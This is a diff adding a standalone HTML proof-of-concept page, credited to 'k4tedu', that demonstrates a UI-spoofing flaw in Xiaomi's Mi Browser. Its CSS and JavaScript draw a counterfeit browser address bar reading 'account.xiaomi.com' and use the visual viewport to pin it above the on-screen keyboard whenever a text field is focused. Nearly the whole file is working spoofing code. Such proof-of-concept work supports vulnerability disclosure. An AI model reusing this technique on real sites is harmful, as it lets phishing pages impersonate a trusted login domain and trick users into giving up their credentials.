@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>PoC - Mi Browser UI Spoofing</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 20px;
+      font-family: sans-serif;
+      background-color: white; 
+      color: black;
+    }
+
+    button { padding: 12px 18px; font-size: 16px; margin-bottom: 10px; cursor: pointer; }
+    textarea { width: 100%; font-size: 18px; padding: 10px; margin-top: 20px; box-sizing: border-box; border: 1px solid #ccc; }
+
+    .fake-bar-outer-rect {
+      position: fixed;
+      width: 100%;
+      left: 0;
+      z-index: 9999;
+      background-color: #121212;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.3s ease, bottom 0.2s ease;
+      pointer-events: none;
+      box-sizing: border-box;
+      padding: 10px 0;
+    }
+
+    .fake-bar-outer-rect.show { 
+      opacity: 1; 
+      visibility: visible; 
+    }
+
+    .fake-bar-inner-flex {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 12px;
+      width: 100%;
+      height: 100%;
+    }
+
+    .mi-island {
+      background-color: #2b2b2b;
+      border-radius: 50px;
+      display: flex;
+      align-items: center;
+      box-sizing: border-box;
+    }
+
+    .island-nav {
+      width: 130px;
+      height: 52px;
+      justify-content: space-around;
+      padding: 0 10px;
+    }
+
+    .nav-arrow {
+      color: #999;
+      font-size: 24px;
+      font-weight: 300;
+    }
+
+    .island-url {
+      height: 52px;
+      flex-grow: 1;
+      max-width: 400px;
+      padding: 0 15px;
+      position: relative;
+    }
+
+    .tabs-icon {
+      width: 24px;
+      height: 24px;
+      border: 2px solid #666;
+      border-radius: 4px;
+      color: #bbb;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      font-weight: bold;
+      flex-shrink: 0;
+    }
+
+    .url-content {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-grow: 1;
+      padding: 0 10px;
+    }
+
+    .url-text {
+      color: #ffffff;
+      font-size: 16px;
+      letter-spacing: 0.1px;
+    }
+
+    .refresh-icon {
+      width: 20px;
+      height: 20px;
+      fill: #bbb;
+      flex-shrink: 0;
+    }
+
+    .island-menu {
+      width: 52px;
+      height: 52px;
+      border-radius: 50%;
+      justify-content: center;
+      padding: 0;
+    }
+
+    .hamburger-icon {
+      width: 18px;
+      height: 18px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+
+    .hamburger-line {
+      width: 100%;
+      height: 2px;
+      background-color: #bbb;
+      border-radius: 1px;
+    }
+
+    .spacer { height: 800px; }
+    .spacer-bottom { height: 1200px; }
+    .bottom-text { font-size: 20px; text-align: center; margin: 20px; color: #888; }
+  </style>
+</head>
+<body>
+
+  <h2>Vulnerability PoC by k4tedu</h2>
+  <p>Scroll down to the middle of the page, then tap the textarea.</p>
+
+  <button id="showBtn">Show Keyboard</button>
+  <textarea id="ta" placeholder="Top input..."></textarea>
+
+  <div class="fake-bar-outer-rect" id="fakeBar">
+    <div class="fake-bar-inner-flex">
+      
+      <div class="mi-island island-nav">
+        <div class="nav-arrow">&lt;</div>
+        <div class="nav-arrow">&gt;</div>
+      </div>
+
+      <div class="mi-island island-url">
+        <div class="tabs-icon">1</div>
+        
+        <div class="url-content">
+          <span class="url-text">account.xiaomi.com</span>
+        </div>
+
+        <svg class="refresh-icon" viewBox="0 0 24 24">
+          <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/>
+        </svg>
+      </div>
+
+      <div class="mi-island island-menu">
+        <div class="hamburger-icon">
+          <div class="hamburger-line"></div>
+          <div class="hamburger-line"></div>
+          <div class="hamburger-line"></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="spacer"></div>
+  <textarea id="middleTa" placeholder="Middle input..."></textarea>
+  <div class="spacer-bottom"></div>
+  
+  <div class="bottom-text">End of Page</div>
+
+  <script>
+    const fakeBar = document.getElementById('fakeBar');
+    const ta = document.getElementById('ta');
+    const middleTa = document.getElementById('middleTa');
+
+    function adjustFakeBar() {
+      const vv = window.visualViewport;
+      if (vv) {
+        const keyboardHeight = window.innerHeight - vv.height - vv.offsetTop;
+        fakeBar.style.bottom = (keyboardHeight > 0 ? keyboardHeight : 0) + 'px';
+      }
+    }
+
+    function showFakeBar() {
+      fakeBar.classList.add('show');
+      adjustFakeBar();
+    }
+
+    function hideFakeBar() {
+      fakeBar.classList.remove('show');
+    }
+
+    if ('visualViewport' in window) {
+      window.visualViewport.addEventListener('resize', adjustFakeBar);
+    }
+
+    document.getElementById("showBtn").onclick = () => {
+      ta.focus();
+      showFakeBar();
+    };
+
+    ta.addEventListener('focus', showFakeBar);
+    middleTa.addEventListener('focus', showFakeBar);
+    
+    ta.addEventListener('blur', hideFakeBar);
+    middleTa.addEventListener('blur', hideFakeBar);
+  </script>
+</body>
+</html>
